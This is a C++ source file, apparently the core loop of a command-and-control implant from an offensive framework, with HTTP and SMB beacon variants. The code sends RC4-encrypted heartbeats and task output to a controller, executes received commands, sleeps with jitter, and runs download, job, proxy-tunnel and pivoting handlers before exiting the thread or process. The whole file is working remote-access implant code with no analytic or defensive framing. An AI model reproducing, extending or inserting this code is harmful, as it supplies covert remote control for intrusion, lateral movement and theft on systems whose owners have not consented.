#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent* g_Agent;

#if defined(BEACON_HTTP)

#include "ConnectorHTTP.h"
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) 
		return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	if ( !g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize) )
		return;

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		if (packerOut->datasize() > 4) {
			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			
			packerOut->Clear(TRUE);
			packerOut->Pack32(0);
		}
		else {
			g_Connector->SendData(NULL, 0);
		}

		if ( g_Connector->RecvSize() && g_Connector->RecvData()) {
			DecryptRC4( g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16 );
			g_Agent->commander->ProcessCommandTasks( g_Connector->RecvData(), g_Connector->RecvSize(), packerOut );
		}
		g_Connector->RecvClear();


		if (g_Agent->IsActive() && packerOut->datasize() < 8 )
			WaitMask( g_Agent->config->sleep_delay, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloader(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);
		g_Agent->proxyfire->ProcessTunnels(packerOut);
		g_Agent->pivotter->ProcessPivots(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	packerOut->Set32(0, packerOut->datasize());

	EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

	g_Connector->SendData(packerOut->data(), packerOut->datasize());
	packerOut->Clear(TRUE);
	g_Connector->RecvClear();

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}



#elif defined(BEACON_SMB)

#include "ConnectorSMB.h"
ConnectorSMB* g_Connector;

void AgentMain()
{
	if (!ApiLoad())
		return;

	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	g_Connector = (ConnectorSMB*)MemAllocLocal(sizeof(ConnectorSMB));
	*g_Connector = ConnectorSMB();

	if (!g_Connector->SetConfig(g_Agent->config->profile, NULL, NULL))
		return;

	ULONG beatSize = 0;
	BYTE* beat = g_Agent->BuildBeat(&beatSize);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	do {
		g_Connector->Listen();

		g_Connector->SendData(beat, beatSize);

		for (int i = (g_Connector->RecvSize() <= 0); g_Connector->RecvSize() >= 0 && g_Agent->IsActive(); i = (g_Connector->RecvSize() <= 0) ) {

    		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
				DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
				g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
				g_Connector->RecvClear();
			}

			g_Agent->downloader->ProcessDownloader(packerOut);
			g_Agent->jober->ProcessJobs(packerOut);
			g_Agent->proxyfire->ProcessTunnels(packerOut);
			g_Agent->pivotter->ProcessPivots(packerOut);

			if (packerOut->datasize() > 4) {
				packerOut->Set32(0, packerOut->datasize());

				EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

				g_Connector->SendData(packerOut->data(), packerOut->datasize());

				packerOut->Clear(TRUE);
				packerOut->Pack32(0);
			}
			else {
				g_Connector->SendData(NULL, 0);
			}

			if (g_Connector->RecvSize() == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
				TEB->LastErrorValue = 0;
				break;
			}
		}

		if (!g_Agent->IsActive()) {
			g_Agent->commander->Exit(packerOut);

			packerOut->Set32(0, packerOut->datasize());

			EncryptRC4(packerOut->data(), packerOut->datasize(), g_Agent->SessionKey, 16);

			g_Connector->SendData(packerOut->data(), packerOut->datasize());
			packerOut->Clear(TRUE);
		}

		g_Connector->Disconnect();

	} while (g_Agent->IsActive());

	MemFreeLocal((LPVOID*)&beat, beatSize);

	g_Connector->CloseConnector();
	AgentClear(g_Agent->config->exit_method);
}
#endif

void AgentClear(int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
